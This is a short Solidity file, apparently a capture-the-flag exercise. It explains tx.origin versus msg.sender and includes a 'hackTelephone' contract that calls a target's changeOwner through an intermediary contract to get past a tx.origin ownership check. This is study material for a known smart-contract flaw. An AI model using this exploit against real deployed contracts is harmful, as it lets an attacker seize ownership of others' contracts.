// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Txorigin {
    // Difference between tx.origin and msg.sender
    /*
        tx.origin will always refer to external account but msg.sender can be contract and external account
    */

    address public txorigin;

    function checktx() public {
        txorigin = tx.origin;
    }
}

interface Telephone {
    function changeOwner(address _owner) external;
}

contract hackTelephone {
    Telephone _telephone;

    constructor(address _tele) {
        _telephone = Telephone(_tele);
    }

    function hack(address _owner) public {
        _telephone.changeOwner(_owner);
    }
}
